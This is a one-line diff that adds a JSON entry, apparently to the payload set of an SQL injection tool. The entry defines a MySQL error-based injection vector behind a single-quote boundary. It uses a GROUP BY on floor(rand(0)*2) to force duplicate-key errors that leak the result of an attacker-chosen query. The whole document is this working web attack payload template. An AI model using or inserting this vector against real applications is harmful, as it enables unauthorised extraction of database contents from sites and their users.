@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "error", "boundary": {"prefix": "'", "suffix": "", "type": "single"}, "vector": "{B} AND (SELECT 1 FROM(SELECT count(*),concat(({Q}),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)", "comment": "mysql error: single"}
